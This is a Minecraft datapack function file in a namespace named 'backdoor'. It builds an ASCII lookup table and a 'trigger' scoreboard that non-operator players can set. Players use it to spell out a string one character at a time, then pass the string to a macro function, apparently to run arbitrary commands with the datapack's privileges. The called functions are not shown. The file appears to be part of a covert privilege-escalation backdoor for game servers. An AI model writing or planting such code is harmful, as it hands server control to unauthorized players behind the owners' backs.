execute unless data storage backdoor:temp askee_lookup run data modify storage backdoor:temp askee_final set value ''

execute unless data storage backdoor:temp askee_lookup run data modify storage backdoor:temp askee_lookup set value [' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',' ']
scoreboard objectives add backdoor.askee trigger
scoreboard players enable @s backdoor.askee

execute if entity @p[tag=backdoor.askee_active] unless entity @s[tag=backdoor.askee_active] run return 0

execute if score @s backdoor.askee matches -2 run data modify storage backdoor:temp askee_string set value ''
execute if score @s backdoor.askee matches -2 run data modify storage backdoor:temp askee_final set value ''
execute if score @s backdoor.askee matches -2 run tellraw @s "cleared!"
execute if score @s backdoor.askee matches -2 run tag @s remove backdoor.askee_active

execute if score @s backdoor.askee matches -1 run function backdoor:askee/0
execute if score @s backdoor.askee matches -1 run function backdoor:askee/0_3 with storage backdoor:temp


execute if score @s backdoor.askee matches 1.. run tag @s add backdoor.askee_active
execute if score @s backdoor.askee matches 1.. store result storage backdoor:temp askee_temp int 1 run scoreboard players get @s backdoor.askee
execute if score @s backdoor.askee matches 1.. run function backdoor:askee/1 with storage backdoor:temp
scoreboard players set @s backdoor.askee 0